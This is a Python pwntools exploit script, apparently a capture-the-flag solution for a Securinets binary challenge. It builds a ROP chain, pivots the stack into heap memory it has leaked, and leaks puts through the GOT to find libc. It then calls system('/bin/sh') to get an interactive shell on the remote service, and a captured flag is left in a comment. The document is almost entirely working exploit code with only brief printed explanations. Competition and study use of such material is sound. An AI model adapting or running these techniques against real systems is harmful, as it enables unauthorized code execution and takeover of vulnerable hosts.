from pwn import *
import struct


def connect():
    if args.LOCAL:
        if args.GDB:
            return gdb.debug(["./main"], api=True)
        else:
            return process(["./main"])
    else:
        return remote("pwn.ctf.securinets.tn", 5555)
        # return remote("localhost", 4005)


def do_prompt(tube, choice):
    tube.sendafter(b"6. Logout.\n", str(choice).encode())


def do_set_creds(tube, username, age):
    do_prompt(tube, 1)
    tube.sendafter(b"Username:", username)
    tube.sendafter(b"age:", age)


def do_add_friend(tube, rop0, rop1):
    do_prompt(tube, 2)
    tube.sendafter(b"Username:", struct.pack("<II", rop0, rop1))


def do_get_friend_addr(tube):
    do_prompt(tube, 4)
    tube.send(b"0")
    i = 0
    addr = 0
    while True:
        leak = tube.recvline()
        if leak == b"\n":
            pass
        elif leak == b"I might give you smthg...\n":
            addr |= 1 << i
        else:
            break
        i += 1
    return addr


def do_magic_move(tube, rop0, rop1, rop2, rop3):
    do_prompt(tube, 5)
    tube.send(struct.pack("<IIII", rop0, rop1, rop2, rop3))


def do_logout(tube):
    do_prompt(tube, 6)


def main():
    u = 0x804C060
    u_age = 0x804C16C
    main = 0x8049629
    main_ret = 0x8049772
    magic_move = 0x804952F
    read_plt = 0x8049040
    puts_plt = 0x8049060
    puts_got = 0x804C00C
    nop0 = 0x8049772
    nop2 = 0x804939B  # pop esi ; pop ebp ; ret
    nop3 = 0x0804939A  # pop ebx ; pop esi ; pop ebp ; ret
    pivot = 0x8049283  # pop ebp ; cld ; leave ; ret
    open_plt = 0x8049090
    pop_ebp = 0x804939C  # pop ebp ; ret
    raw_pivot = 0x8049285  # leave; ret
    sendfile_plt = 0x8049070
    # python a=bytes(gdb.selected_inferior().read_memory(0x8048000,0x804c1d4-0x8048000))
    # (gdb) python print(max([(a[i:].find(b'\0'),hex(0x8048000+i)) for i in range(len(a))]))
    # (86, '0x80496ba')
    longest = 0x80496BA
    libc_start_main_str = 0x80482D6
    with connect() as tube:
        if args.LOCAL and args.GDB:
            # tube.gdb.execute(f"b *0x{main:x}")
            # tube.gdb.execute("b malloc")
            tube.gdb.execute(f"b *0x{main_ret:x}")
            # tube.gdb.execute("b __libc_system")
            tube.gdb.continue_nowait()

        print("*" * 80)
        print("puts() at the end of main() triggers a relatively")
        print("large FILE buffer allocation. Restart to trigger it.")
        print("Maintain stack alignment.")
        print("*" * 80)
        do_magic_move(tube, nop2, 0, 0, main)
        do_logout(tube)

        print("*" * 80)
        print("Allocate some users to satisfy our stack needs.")
        print("*" * 80)
        for _ in range(2):
            do_add_friend(tube, 0, 0)
            do_magic_move(tube, nop2, 0, 0, main)
            do_logout(tube)

        print("*" * 80)
        print("Allocate a user and pivot to it.")
        print("*" * 80)
        do_add_friend(tube, main, magic_move)
        stk = do_get_friend_addr(tube)
        print(f"friend_addr=0x{stk:x}")
        do_magic_move(tube, pivot, stk - 4, 0, 0)
        do_logout(tube)

        print("*" * 80)
        print("main() now runs on a known stack:")
        print("stk+4: [magic_move, 0, stk+8, 0x22, 0xdeadbeef, 0x44]")
        print("*" * 80)
        do_magic_move(tube, stk + 8, 0x22, 0x33, 0x44)
        do_logout(tube)

        print("*" * 80)
        print("stk+8: [magic_move, read, stk+16, 0x44]")
        payload = b""
        payload += struct.pack("<IIII", magic_move, read_plt, stk + 16, 0x44)

        print("stk+12: [read, 0x11, 0, stk+16, 24]")
        payload += struct.pack("<IIII", 0x11, 0, stk + 16, 24)

        print("stk+16: [puts@plt, read, puts@got, 0, stk+24, 40]")
        payload += struct.pack("<IIIIII", puts_plt, read_plt, puts_got, 0, stk + 24, 40)

        print("flush stdin")
        # Remote weirdness.
        # 64 = no flush
        # 128 = crash
        flush_iters = 96
        for i in range(flush_iters):
            flush_stk_off = 24 if i == 0 else 1000
            next_size = 20 if i == (flush_iters - 1) else 40
            print(
                f"stk+{flush_stk_off}: [puts@plt, pop_ebp, longest, pop_ebp, stk+1000-4, read, raw_pivot, 0, stk+1000, {next_size}]"
            )
            payload += struct.pack(
                "<IIIIIIIIII",
                puts_plt,
                pop_ebp,
                longest,
                pop_ebp,
                stk + 1000 - 4,
                read_plt,
                raw_pivot,
                0,
                stk + 1000,
                next_size,
            )

        print("*")
        tube.send(payload)
        tube.recvuntil(b"\x60")
        (puts,) = struct.unpack("<I", b"\x60" + tube.recvn(3))
        print(f"puts=0x{puts:x}")
        libc = puts - 0x73260
        print(f"libc=0x{libc:x}")
        assert libc & 0xFFF == 0
        system = libc + 0x48150
        print(f"system=0x{system:x}")
        write = libc + 0x10A190
        print(f"write=0x{write:x}")

        print("*" * 80)
        print('stk+1000: [system, 0x22, stk+1012, "/bin/sh\\0"]')
        print("*" * 80)
        tube.send(struct.pack("<III", system, 0x22, stk + 1012) + b"/bin/sh\0")

        # Securinets{356dac5435e68133b4182ef00a89b70d360d92ac046c028ec9cf4fe495eda68b}

        tube.interactive()


if __name__ == "__main__":
    main()
